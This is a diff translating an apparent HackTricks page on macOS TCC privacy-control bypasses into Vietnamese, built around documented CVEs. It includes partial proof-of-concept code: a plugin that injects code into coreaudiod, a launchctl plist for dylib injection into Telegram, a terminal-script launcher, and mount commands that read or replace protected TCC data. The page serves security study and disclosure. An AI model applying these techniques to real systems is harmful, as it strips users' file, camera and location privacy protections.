+Có thể chạy **`configd`** với tùy chọn **`-t`**, cho phép kẻ tấn công chỉ định **Bundle tùy chỉnh để tải**. Do đó, exploit **thay thế** phương thức dùng **`dsexport`** và **`dsimport`** để đổi thư mục home của người dùng bằng cách **code injection vào `configd`**.
 
-For more info check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>
+Để biết thêm thông tin, xem [**báo cáo gốc**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>
 
-## By process injection
+## Bằng process injection
 
-There are different techniques to inject code inside a process and abuse its TCC privileges:
+Có nhiều kỹ thuật để inject code vào một tiến trình và lạm dụng quyền TCC của tiến trình đó:
 
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-Moreover, the most common process injection to bypass TCC found is via **plugins (load library)**.\
-Plugins are extra code usually in the form of libraries or plist, that will be **loaded by the main application** and will execute under its context. Therefore, if the main application had access to TCC restricted files (via granted permissions or entitlements), the **custom code will also have it**.
+Ngoài ra, hình thức process injection phổ biến nhất được tìm thấy để bypass TCC là thông qua **plugins (load library)**.\
+Plugins là phần code bổ sung, thường ở dạng library hoặc plist, được **ứng dụng chính tải vào** và thực thi trong context của ứng dụng đó. Vì vậy, nếu ứng dụng chính có quyền truy cập vào các file bị TCC hạn chế (thông qua quyền đã được cấp hoặc entitlements), **custom code cũng sẽ có quyền đó**.
 
 ### CVE-2020-27937 - Directory Utility
 
-The application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, loaded plugins with **`.daplug`** extension and **didn't have the hardened** runtime.
+Ứng dụng `/System/Library/CoreServices/Applications/Directory Utility.app` có entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, tải plugins có phần mở rộng **`.daplug`** và **không bật hardened runtime**.
 
-To weaponize this CVE, the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) to **take over the user's TCC database** and bypass TCC.
+Để weaponize CVE này, **`NFSHomeDirectory`** được **thay đổi** (lạm dụng entitlement nêu trên) nhằm **chiếm quyền TCC database của người dùng** và bypass TCC.
 
-For more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>
+Để biết thêm thông tin, xem [**báo cáo gốc**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>
 
 ### CVE-2020-29621 - Coreaudiod
 
-The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.
+Binary **`/usr/sbin/coreaudiod`** có các entitlements `com.apple.security.cs.disable-library-validation` và `com.apple.private.tcc.manager`. Entitlement đầu tiên **cho phép code injection**, còn entitlement thứ hai cấp quyền **quản lý TCC**.
 
-This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:<sup>[[13]](#references)</sup>
+Binary này cho phép tải **third-party plug-ins** từ thư mục `/Library/Audio/Plug-Ins/HAL`. Vì vậy, có thể **tải plugin và lạm dụng quyền TCC** bằng POC này:<sup>[[13]](#references)</sup>
 
 ```objectivec
 #import <Foundation/Foundation.h>
@@ -324,19 +324,19 @@ __attribute__((constructor)) static void constructor(int argc, const char **argv
     exit(0);
 ```
 
-For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>
+Để biết thêm thông tin, hãy xem [**báo cáo gốc**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>
 
-### Device Abstraction Layer (DAL) Plug-Ins
+### Plug-In của Device Abstraction Layer (DAL)
 
-System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).
+Các ứng dụng hệ thống mở luồng camera thông qua Core Media I/O (các ứng dụng có **`kTCCServiceCamera`**) sẽ tải **các plugin này vào tiến trình** từ `/Library/CoreMediaIO/Plug-Ins/DAL` (không bị SIP hạn chế).
 
-Just storing in there a library with the common **constructor** will work to **inject code**.
+Chỉ cần lưu một library có **constructor** thông thường tại đó là đủ để **inject code**.
 
-Several Apple applications were vulnerable to this.
+Một số ứng dụng của Apple đã bị ảnh hưởng bởi lỗ hổng này.
 
 ### Firefox
 
-The Firefox application had the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:<sup>[[14]](#references)</sup>
+Ứng dụng Firefox có các entitlement `com.apple.security.cs.disable-library-validation` và `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
 
 ```xml
 codesign -d --entitlements :- /Applications/Firefox.app
@@ -364,17 +364,17 @@ Executable=/Applications/Firefox.app/Contents/MacOS/firefox
 </plist>
 ```
 
-Fore more info about how to easily exploit this [**check the original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>
+Để biết thêm thông tin về cách dễ dàng khai thác lỗi này, [**hãy xem báo cáo gốc**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>
 
 ### CVE-2020-10006
 
-The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.
+Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` có các entitlement **`com.apple.private.tcc.allow`** và **`com.apple.security.get-task-allow`**, cho phép inject code vào tiến trình và sử dụng các quyền TCC.
 
 ### CVE-2023-26818 - Telegram
 
-Telegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>
+Telegram có các entitlement **`com.apple.security.cs.allow-dyld-environment-variables`** và **`com.apple.security.cs.disable-library-validation`**, nên có thể lạm dụng ứng dụng để **truy cập các quyền của nó**, chẳng hạn như quyền ghi hình bằng camera. Bạn có thể [**tìm payload trong bài viết chi tiết**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>
 
-Note how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`** was used to launch it:<sup>[[15]](#references)</sup>
+Lưu ý rằng để dùng biến môi trường tải một thư viện, người ta đã tạo một **plist tùy chỉnh** để inject thư viện này và dùng **`launchctl`** để khởi chạy nó:<sup>[[15]](#references)</sup>
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -406,15 +406,15 @@ Note how to use the env variable to load a library a **custom plist** was create
 launchctl load com.telegram.launcher.plist
 ```
 
-## By open invocations
+## Bằng cách gọi open
 
-It's possible to invoke **`open`** even while sandboxed
+Có thể gọi **`open`** ngay cả khi đang ở trong sandbox
 
 ### Terminal Scripts
 
-It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.
+Việc cấp **Full Disk Access (FDA)** cho terminal khá phổ biến, ít nhất là trên các máy tính được dân công nghệ sử dụng. Và có thể gọi các script **`.terminal`** bằng terminal đó.
 
-**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:
+Các script **`.terminal`** là các file plist như ví dụ này, chứa lệnh cần thực thi trong khóa **`CommandString`**:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -434,7 +434,7 @@ It's quiet common to give terminal **Full Disk Access (FDA)**, at least in compu
 </plist>
 ```
 
-An application could write a terminal script in a location such as /tmp and launch it with a come such as:
+Một ứng dụng có thể ghi một script terminal vào một vị trí như /tmp rồi khởi chạy nó bằng một lệnh như:
 
 ```objectivec
 // Write plist in /tmp/tcc.terminal
@@ -447,12 +447,12 @@ exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
 
-## By mounting
+## Bằng cách mount
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - mount_apfs TCC bypass và leo thang đặc quyền
 
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.<sup>[[2]](#references)</sup>
+**Bất kỳ người dùng nào** (kể cả người dùng không có đặc quyền) đều có thể tạo và mount snapshot của Time Machine, rồi **truy cập TẤT CẢ các tệp** trong snapshot đó.\
+**Đặc quyền duy nhất** cần thiết là ứng dụng được sử dụng (như `Terminal`) phải có quyền **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), và quyền này cần được admin cấp.<sup>[[2]](#references)</sup>
 
 ```bash
 # Create snapshot
@@ -474,11 +474,11 @@ mkdir /tmp/snap
 ls /tmp/snap/Users/admin_user # This will work
 ```
 
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>
+Có thể xem [**bản báo cáo gốc**](https://theevilbit.github.io/posts/cve_2020_9771/)** để biết giải thích chi tiết hơn.**<sup>[[20]](#references)</sup>
 
-### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file
+### CVE-2021-1784 & CVE-2021-30808 - Mount đè lên tệp TCC
 
-Even if TCC DB file is protected, It was possible to **mount over the directory** a new TCC.db file:
+Ngay cả khi tệp TCC DB được bảo vệ, vẫn có thể **mount đè lên thư mục** một tệp TCC.db mới:
 
 ```bash
 # CVE-2021-1784
@@ -501,56 +501,56 @@ def create_dmg():
     os.system("hdiutil detach /tmp/mnt 1>/dev/null")
 ```
 
-Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>
+Kiểm tra **full exploit** trong [**bài viết gốc**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>
 
 ### CVE-2024-40855
 
-As explained in the [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), this CVE abused `diskarbitrationd`.<sup>[[16]](#references)</sup>
+Như giải thích trong [bài viết gốc](https://www.kandji.io/blog/macos-audit-story-part2), CVE này khai thác `diskarbitrationd`.<sup>[[16]](#references)</sup>
 
-The function `DADiskMountWithArgumentsCommon` from the public `DiskArbitration` framework performed the security checks. However, it's possible to bypass it by directly calling `diskarbitrationd` and therefore use `../` elements in the path and symlinks.
+Hàm `DADiskMountWithArgumentsCommon` từ framework công khai `DiskArbitration` thực hiện các kiểm tra bảo mật. Tuy nhiên, có thể bypass các kiểm tra này bằng cách gọi trực tiếp `diskarbitrationd`, từ đó sử dụng các phần tử `../` trong đường dẫn và symlink.
 
-This allowed an attacker to do arbitrary mounts in any location, including over the TCC database due to the entitlement `com.apple.private.security.storage-exempt.heritable` of `diskarbitrationd`.
+Điều này cho phép kẻ tấn công thực hiện các thao tác mount tùy ý ở bất kỳ vị trí nào, kể cả mount đè lên cơ sở dữ liệu TCC nhờ entitlement `com.apple.private.security.storage-exempt.heritable` của `diskarbitrationd`.
 
 ### asr
 
-The tool **`/usr/sbin/asr`** allowed to copy the whole disk and mount it in another place bypassing TCC protections.
+Công cụ **`/usr/sbin/asr`** cho phép sao chép toàn bộ ổ đĩa và mount bản sao ở một vị trí khác, bypass các biện pháp bảo vệ TCC.
 
 ### CVE-2022-22655 - Location Services
 
-Location Services are **not** stored in a TCC database like the other services. They are managed by `locationd`, which keeps its own allow-list in **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
+Location Services **không** được lưu trong cơ sở dữ liệu TCC như các dịch vụ khác. Chúng được quản lý bởi `locationd`, tiến trình duy trì danh sách cho phép riêng tại **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
 
 ```bash
 # Requires FDA to read
 sudo plutil -p /var/db/locationd/clients.plist | head -40
 ```
 
-Each entry is keyed by the client (bundle ID or executable path) and carries fields such as `Authorized`, `BundleId`, `Executable` and `Registered`.<sup>[[4]](#references)</sup>
+Mỗi mục được khóa theo client (bundle ID hoặc executable path) và chứa các trường như `Authorized`, `BundleId`, `Executable` và `Registered`.<sup>[[4]](#references)</sup>
 
-The `clients.plist` file itself is protected by Sandbox/TCC and cannot be edited even as root — but the **`/var/db/locationd/` directory was not protected from mounting**. So an attacker running as root could build a disk image containing their own `clients.plist` (with their binary marked `Authorized`), mount it over the directory, and restart `locationd` to have the forged allow-list take effect.<sup>[[3]](#references)</sup>
+Bản thân tệp `clients.plist` được bảo vệ bởi Sandbox/TCC và không thể chỉnh sửa ngay cả khi là root — nhưng **thư mục `/var/db/locationd/` không được bảo vệ khỏi việc mount**. Vì vậy, kẻ tấn công chạy với quyền root có thể tạo disk image chứa `clients.plist` của riêng mình (trong đó binary của họ được đánh dấu `Authorized`), mount image đó đè lên thư mục, rồi khởi động lại `locationd` để danh sách allow-list giả mạo có hiệu lực.<sup>[[3]](#references)</sup>
 
 > [!TIP]
-> This is the same pattern as the `hdiutil`/`mount` TCC bypasses above: the *file* is protected, the *directory it lives in* is not, so you replace the whole directory instead of the file.
+> Đây là cùng một kiểu với các TCC bypass `hdiutil`/`mount` ở trên: *file* được bảo vệ, còn *thư mục chứa nó* thì không, nên bạn thay cả thư mục thay vì chỉ thay file.
 
-## By startup apps
+## Qua startup apps
 
 
 {{#ref}}
 ../../../../macos-auto-start-locations.md
 {{#endref}}
 
-## By grep
+## Qua grep
 
-In several occasions files will store sensitive information like emails, phone numbers, messages... in non protected locations (which count as a vulnerability in Apple).
+Trong một số trường hợp, các file lưu thông tin nhạy cảm như email, số điện thoại, tin nhắn... ở những vị trí không được bảo vệ (đây được xem là lỗ hổng trong Apple).
 
 <figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>
 
 ## Synthetic Clicks
 
-This doesn't work anymore, but it [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
+Cách này hiện không còn hoạt động, nhưng [**trước đây thì có**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**
 
 <figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>
 
-Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>
+Một cách khác sử dụng [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>
 
 <figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>
 
@@ -558,28 +558,28 @@ Another way using [**CoreGraphics events**](https://objectivebythesea.org/v2/tal
 
 ## References
 
-- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
-- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
-- [4] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
-- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
-- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
-- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
-- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
-- [9] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
-- [10] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
-- [11] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
-- [12] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
-- [13] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
-- [14] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
-- [15] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
-- [16] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
+- [1] [CVE-2020–9934: Vượt qua macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
+- [2] [Vô tình và có chủ đích vượt qua các biện pháp bảo vệ quyền riêng tư người dùng của macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
+- [3] [CVE-2022-22655 - Vượt qua TCC Location Services (báo cáo gốc)](https://theevilbit.github.io/posts/cve-2022-22655/)
+- [4] [Carmen Sandiego đang ở đâu: Lạm dụng Location Services trên macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
+- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass đánh cắp dữ liệu từ iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
+- [6] [SQLite - `test_sqllog.c` (các biến môi trường SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
+- [7] [Apple - Entitlement cho phép các biến môi trường DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
+- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
+- [9] [Phát hiện TCC bypass zero-day trong malware XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
+- [10] [OBTS v5.0: "Điều gì xảy ra trên máy Mac của bạn sẽ ở lại trên iCloud của Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+- [11] [Lỗ hổng macOS mới, "powerdir," có thể dẫn đến truy cập trái phép dữ liệu người dùng](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
+- [12] [Thay đổi thư mục home và vượt qua TCC, hay CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
+- [13] [Phát nhạc và vượt qua TCC, hay CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
+- [14] [Cách đánh cắp một con (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
+- [15] [CVE-2023-26818 - Vượt qua TCC bằng Telegram trên macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+- [16] [Kandji - Khám phá lỗ hổng Apple: Kiểm tra diskarbitrationd và storagekitd, Phần 2](https://www.kandji.io/blog/macos-audit-story-part2)
 - [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
-- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
-- [19] [Stack Overflow - Setting environment variables on OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
-- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass and privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
-- [21] [theevilbit - CVE-2021-30808: TCC bypass by mounting over the TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
-- [22] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
-- [23] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
-- [24] [From Spotlight to Apple Intelligence — Abusing an 0day to steal the data that fuels macOS AI](https://objective-see.org/blog/blog_0x81.html)
+- [18] [breakpointHQ/TCC-ClickJacking - Bằng chứng khái niệm](https://github.com/breakpointHQ/TCC-ClickJacking)
+- [19] [Stack Overflow - Thiết lập biến môi trường trên OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
+- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass và leo thang đặc quyền](https://theevilbit.github.io/posts/cve_2020_9771/)
+- [21] [theevilbit - CVE-2021-30808: TCC bypass bằng cách mount đè lên cơ sở dữ liệu TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
+- [22] [Hơn 20 cách vượt qua cơ chế quyền riêng tư của macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
+- [23] [Chiến thắng áp đảo trước TCC - Hơn 20 cách MỚI để vượt qua cơ chế quyền riêng tư của macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
+- [24] [Từ Spotlight đến Apple Intelligence — Lạm dụng 0day để đánh cắp dữ liệu cung cấp sức mạnh cho AI trên macOS](https://objective-see.org/blog/blog_0x81.html)
 {{#include ../../../../../banners/hacktricks-training.md}}
